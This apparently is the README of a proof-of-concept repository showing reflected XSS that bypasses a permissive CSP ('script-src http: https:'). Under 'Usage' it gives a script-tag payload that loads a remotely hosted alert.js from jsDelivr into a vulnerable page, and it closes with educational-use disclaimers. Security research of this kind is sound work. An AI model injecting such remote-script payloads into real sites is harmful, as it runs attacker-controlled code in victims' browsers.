# XSS PoC — CSP Bypass via External Script

> **Educational purpose only. Do not use against systems you do not own or have explicit permission to test.**

## Context

This PoC demonstrates a Reflected XSS exploiting a weak CSP policy:
```
Content-Security-Policy: script-src http: https:
```

This policy blocks inline scripts but allows any external script loaded via HTTP/HTTPS — making it bypassable via a remotely hosted `.js` file.

## Usage

1. Inject the following payload in the vulnerable parameter:
```
<script src="https://cdn.jsdelivr.net/gh/Sopland520/xss-poc@main/alert.js"></script>
```

3. The browser loads and executes the remote script in the context of the vulnerable page.

## Files

- `alert.js` — JavaScript payload executed in the victim's browser

## Disclaimer

This repository is intended solely for educational purposes and authorized security research. The author takes no responsibility for any misuse, damage, or illegal activity carried out using the tools or techniques described here. By using this repository, you agree that you are solely responsible for your actions and that you have obtained explicit written permission from the target system owner before conducting any tests.

Unauthorized use of these techniques against systems you do not own is illegal and punishable by law.
